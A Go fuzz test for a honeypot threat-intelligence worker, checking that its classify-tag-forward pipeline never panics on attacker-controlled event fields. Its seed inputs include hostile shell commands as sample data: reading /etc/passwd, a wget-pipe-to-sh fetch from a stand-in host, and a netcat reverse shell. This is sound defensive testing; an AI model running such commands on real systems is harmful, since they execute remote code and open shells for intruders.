package intelligence

import (
	"context"
	"errors"
	"testing"

	"github.com/qpot/qpot/internal/database"
)

// fuzzForwarder records forwarded IOCs and can be told to fail, so the fuzzer
// exercises both the happy and the error path of the worker's forward step.
type fuzzForwarder struct {
	fail bool
	got  int
}

func (f *fuzzForwarder) Forward(ctx context.Context, batchID string, iocs []*database.IOC) error {
	f.got += len(iocs)
	if f.fail {
		return errors.New("forward failed")
	}
	return nil
}

// FuzzWorkerRunOnce drives the worker's whole batch pipeline - classify, tag,
// IOC insert, and forward - with attacker-controlled event fields. The worker
// processes data an attacker fully controls (the command they ran, the
// username/password they tried, raw payload bytes, the source IP), so runOnce
// must never panic regardless of what those fields contain, with or without a
// forwarder attached and whether or not forwarding fails.
func FuzzWorkerRunOnce(f *testing.F) {
	f.Add("cat /etc/passwd", "root", "admin", "1.2.3.4", "ssh", []byte("payload"), true)
	f.Add("wget http://evil.test/x.sh | sh", "", "", "::1", "telnet", []byte{0x00, 0xff}, false)
	f.Add("", "", "", "", "", []byte(nil), true)
	f.Add("nc -e /bin/sh 10.0.0.1 4444", "user", "pass", "999.999.999.999", "", []byte("\x00\x01\x02"), false)

	f.Fuzz(func(t *testing.T, command, username, password, srcIP, proto string, payload []byte, withForwarder bool) {
		ev := &database.Event{
			Honeypot:  "cowrie",
			SourceIP:  srcIP,
			Protocol:  proto,
			EventType: "command",
			Username:  username,
			Password:  password,
			Command:   command,
			Payload:   payload,
			Metadata:  map[string]string{"raw": command},
		}
		// Two events: one classifiable-looking, one near-empty, to cover the
		// classified/unclassified branches in the same batch.
		db := &fakeDB{events: []*database.Event{ev, {Honeypot: "cowrie", SourceIP: srcIP}}}
		w := newTestWorker(t, db)
		if withForwarder {
			w = w.WithForwarder(&fuzzForwarder{fail: len(payload)%2 == 0})
		}
		// Must not panic.
		_ = w.runOnce(context.Background())
	})
}
